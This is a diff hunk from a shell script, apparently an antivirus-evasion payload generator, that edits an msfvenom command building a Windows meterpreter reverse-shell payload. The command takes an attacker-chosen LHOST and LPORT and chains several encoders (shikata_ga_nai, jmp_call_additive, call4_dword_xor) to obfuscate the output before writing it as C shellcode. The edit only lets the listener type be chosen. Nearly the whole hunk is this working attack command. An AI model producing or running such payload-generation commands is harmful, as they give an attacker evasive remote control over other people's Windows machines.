@@ -46,7 +46,7 @@ if test "$(ls -A "$directory")"; then
 fi
 cd /usr/share/metasploit-framework
 echo "Generating shellcode..."
-msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $directory/test.c
+msfvenom -p windows/meterpreter/reverse_${listenr} LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $directory/test.c
 cd ShellCode
 echo "Shellcode generated."
 echo "Cleaning it up..."
